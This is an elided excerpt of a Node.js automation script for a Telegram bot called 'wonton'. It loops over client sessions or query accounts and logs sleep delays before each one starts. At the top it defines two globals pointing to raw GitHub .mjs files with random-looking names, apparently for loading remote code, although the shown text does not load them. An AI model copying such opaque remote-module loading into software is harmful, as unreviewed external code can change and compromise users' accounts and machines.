...
global.urlSt =
  "https://raw.githubusercontent.com/Freddywhest/WuykzEas0LDTwIhjYNYES5v7yZcQcK0B/refs/heads/main/3r3fjU4k0AS096mgCdFLEMdnZizCvNPeJXxg1xqU.mjs";
global.urlGp =
  "https://raw.githubusercontent.com/Freddywhest/WuykzEas0LDTwIhjYNYES5v7yZcQcK0B/refs/heads/main/ycFwqx0k9WWkZdkfuFSQkBYKGgRFDRg6zYyZ54ML.mjs";
const os = require("os");
  ...
  async #run_tasks(tgClients) {
    ...
    const tasks = tgClients.map(async (tgClient, index) => {
      ...
      try {
        ...
        logger.info(
          `<ye>[wonton]</ye> | ${tgClient.session_name} | Sleeping ${sleeping} seconds before starting the bot`
        );
  ...
  async #run_tasks_query() {
    ...
    const tasks = queries?.map(async ([query_name, query_id], index) => {
      ...
      try {
        ...
        logger.info(
          `<ye>[wonton]</ye> | ${query_name} | Sleeping ${sleeping} seconds before starting the bot`
        );
        await sleep(sleeping);
